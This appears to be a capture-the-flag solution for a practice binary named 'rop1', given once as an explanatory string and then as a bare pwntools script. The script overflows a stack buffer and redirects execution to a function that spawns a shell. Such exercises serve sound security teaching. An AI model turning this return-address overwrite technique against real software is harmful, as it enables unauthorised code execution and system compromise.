("To solve this challenge using pwntools, we'll exploit the buffer overflow "
 'vulnerability in the `vulnerable_function` to overwrite the return address '
 'and redirect execution flow to the `not_called` function, which executes '
 '`system("/bin/bash")`. Since the binary is not position-independent (PIE is '
 'disabled) and NX is enabled, we cannot execute shellcode on the stack, but '
 'we can redirect execution to existing code in the binary.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Load the ELF binary\n'
 "elf = ELF('./pwn/stack/rop-1/rop1')\n"
 '\n'
 '# Start the process\n'
 "p = process('./pwn/stack/rop-1/rop1')\n"
 '\n'
 '# Calculate the offset to the return address\n'
 'offset = 136 + 4  # Buffer size + saved EBP (frame pointer)\n'
 '\n'
 '# Build the payload\n'
 "payload = b'A' * offset\n"
 "payload += p32(elf.symbols['not_called'])\n"
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Interact with the shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 'This script performs the following steps:\n'
 '\n'
 "1. **Load the binary** using pwntools' `ELF` function to access symbols like "
 '`not_called`.\n'
 '2. **Start the process** to interact with the binary locally.\n'
 '3. **Calculate the offset** to the return address based on the buffer size '
 'in the vulnerable function (136 bytes) plus 4 bytes for the saved base '
 'pointer.\n'
 "4. **Build the payload** by filling the buffer with junk data (`'A' * "
 'offset`) and appending the address of the `not_called` function.\n'
 '5. **Send the payload** to the binary, overwriting the return address.\n'
 "6. **Interact with the shell** spawned by the `not_called` function's call "
 'to `system("/bin/bash")`.\n'
 '\n'
 'Make sure the binary is accessible at the specified path '
 '(`./pwn/stack/rop-1/rop1`) and has the necessary permissions to execute.')

from pwn import *

# Load the ELF binary
elf = ELF('./pwn/stack/rop-1/rop1')

# Start the process
p = process('./pwn/stack/rop-1/rop1')

# Calculate the offset to the return address
offset = 136 + 4  # Buffer size + saved EBP (frame pointer)

# Build the payload
payload = b'A' * offset
payload += p32(elf.symbols['not_called'])  # Overwrite return address with 'not_called' function address

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()